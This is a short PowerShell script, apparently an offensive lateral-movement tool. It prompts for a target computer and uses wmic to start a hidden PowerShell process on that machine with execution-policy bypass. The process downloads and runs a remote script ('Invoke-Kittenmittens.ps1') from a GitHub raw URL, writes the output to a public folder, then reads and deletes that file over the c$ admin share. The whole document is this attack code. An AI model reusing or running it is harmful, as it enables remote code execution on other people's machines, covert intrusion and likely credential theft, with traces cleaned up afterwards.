$computer =  Read-host -Prompt 'Enter Computer Name'  
$IP = [System.Net.Dns]::GetHostAddresses($computer).IPaddresstostring[0]
$website = 'https://raw.githubusercontent.com/JosephKer/puddin/master/Powershell/Invoke-Kittenmittens.ps1'
$command = 'wmic /node:' + $IP + ' ' +'process call create "powershell.exe -exec bypass -NoP -Noni -Win hidden IEX (New-Object Net.WebClient).DownloadString('+ "'"  + $website + "'" +')|Out-file C:\\Users\\public\\a.txt"'

try {
Invoke-Expression $command -ErrorAction stop
} catch {
Write-host 'wmic did not run'
}
write-host 'Running please wait'
sleep 15
try{
Get-Content \\$computer\c$\users\public\a.txt
} catch {
Write-Host 'File not Found'
}
try {
Remove-Item \\$computer\c$\users\public\a.txt -ErrorAction Stop
} catch {
Write-Host 'No file to delete'
}
pause
